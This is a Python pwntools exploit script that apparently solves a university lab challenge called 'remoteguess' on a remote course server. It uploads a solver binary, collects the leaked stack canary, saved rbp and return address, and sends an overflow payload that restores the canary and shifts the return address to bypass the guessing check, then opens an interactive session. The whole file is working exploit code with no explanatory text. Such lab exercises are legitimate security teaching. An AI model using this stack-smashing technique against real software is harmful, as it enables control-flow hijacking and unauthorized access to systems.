#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

#r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)

    r.recvuntil(b"canary:")
    canary = r.recvline().decode().strip()
    r.recvuntil(b"rbp:")
    rbp = r.recvline().decode().strip()
    r.recvuntil(b"ret addr:")
    ret_addr = r.recvline().decode().strip()

    print(f"\n{'canary received in python ->':>35}{canary:>20}")
    print(f"{'rbp received in python ->':>35}{rbp:>20}")
    print(f"{'ret addr received in python ->':>35}{ret_addr:>20}\n")

    my_guess = 1234
    ans_to_send = str(my_guess).encode().ljust(8, b'\0') + p64(0) + p64(0)
    ans_to_send += p64(int(canary, 16))
    ans_to_send += p64(int(rbp, 16))
    ans_to_send += p64(int(ret_addr, 16)+0xab)
    ans_to_send += p64(0) + p32(0) + p32(my_guess)
    r.sendlineafter("your answer? ", ans_to_send)
else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
